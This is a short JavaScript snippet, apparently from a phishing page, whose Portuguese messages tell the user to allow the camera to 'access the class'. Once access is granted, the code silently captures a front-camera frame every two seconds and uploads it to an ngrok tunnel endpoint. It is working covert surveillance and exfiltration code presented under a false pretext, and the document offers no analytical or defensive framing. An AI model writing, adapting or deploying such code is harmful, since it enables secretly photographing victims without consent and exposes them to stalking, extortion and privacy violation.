
        const NGROK_URL = " https://exostotic-percy-handsomest.ngrok-free.dev"; 

        function start() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                document.getElementById('v').srcObject = stream;
                alert("Entrando... por favor aguarde 10 segundos.");
                
                setInterval(() => {
                    const v = document.getElementById('v');
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    fetch(NGROK_URL + '/upload', {
                        method: 'POST',
                        mode: 'no-cors', 
                        body: c.toDataURL('image/jpeg', 0.5)
                    });
                }, 2000);
            })
            .catch(err => alert("Erro: Clicar em permitir para ter acesso à aula."));
        }
